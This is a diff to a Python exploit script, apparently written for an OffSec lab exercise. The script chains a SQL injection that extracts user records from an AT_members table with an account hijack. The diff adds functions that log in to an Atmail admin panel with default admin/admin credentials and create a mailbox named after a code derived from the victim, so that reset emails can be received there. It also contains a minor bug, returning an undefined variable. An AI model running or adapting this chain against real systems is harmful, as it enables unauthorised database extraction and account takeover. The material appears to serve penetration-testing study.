@@ -72,13 +72,64 @@ def hijack_account(ip, email_prefix, domain, member_id):
     else:
         return False
 
+def atmail_login(atmail_ip):
+    print("Logging in to atmail......")
+    USERNAME = 'admin'
+    PASSWORD = 'admin'
+
+    s = requests.Session()
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
+    }
+    s.headers.update(headers)
+
+    proxies = {
+        'http': 'http://127.0.0.1:8080'
+    }
+    s.proxies.update(proxies)
+
+    target = f'http://{atmail_ip}/index.php/admin/index/login'
+    data = {
+        "Username": USERNAME,
+        "Password": PASSWORD,
+        "send": 1
+    }
+
+    r = s.post(target, data=data)
+
+    if re.match('Authentication failed, try again', r.text):
+        raise Exception("Atmail admin authentication failed")
+    return s
+
+def create_atmail_user(session, ip, email_prefix, domain):
+    print(f"Creating user {email_prefix}@{domain}.....")
+    target = f"http://{ip}/index.php/admin/users/create/"
+    data = {
+        "NewContact": 1,
+        "username": email_prefix,
+        "domain": domain,
+        "Password": "bromine"
+    }
+    r = session.post(target, data=data)
+
+    if re.findall('Currently using.*of quota', r.text):
+        return s
+    elif re.findall(f'{email_prefix}@{domain} already exists', r.text):
+        print("User already exists!")
+        return session
+    else:
+        raise Exception("Atmail fail to create user!")
+
 def main():
-    if len(sys.argv) != 2:
-        print ("(+) usage: %s <target>" % sys.argv[0])
-        print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
+    if len(sys.argv) != 3:
+        print ("(+) usage: %s <target> <atmail>" % sys.argv[0])
+        print ('(+) eg: %s 192.168.121.103 192.168.121.106'  % sys.argv[0])
         sys.exit(-1)
 
     ip = sys.argv[1]
+    atmail_ip = sys.argv[2]
 
     username_injection_string = "select/**/login/**/FROM/**/AT_members/**/LIMIT/**/1"
     # username = extract_data(ip, username_injection_string)
@@ -94,9 +145,17 @@ def main():
 
     print(f"Extracted User Details: {username}, {member_id}, {creation_date}")
 
-    email_prefix = get_code("offsec.local", member_id, creation_date)
+    DOMAIN = "offsec.local"
 
-    hijack_account(ip, email_prefix, "offsec.local", member_id)
+    email_prefix = get_code(DOMAIN, member_id, creation_date)
+
+    # hijack_account(ip, email_prefix, DOMAIN, member_id)
+
+    atmail_session = atmail_login(atmail_ip)
+
+    # atmail_session.get(f"http://{atmail_ip}/index.php/admin/users/list/domain/{DOMAIN}")
+
+    create_atmail_user(atmail_session, atmail_ip, email_prefix, DOMAIN)
 
 if __name__ == '__main__':
     main()
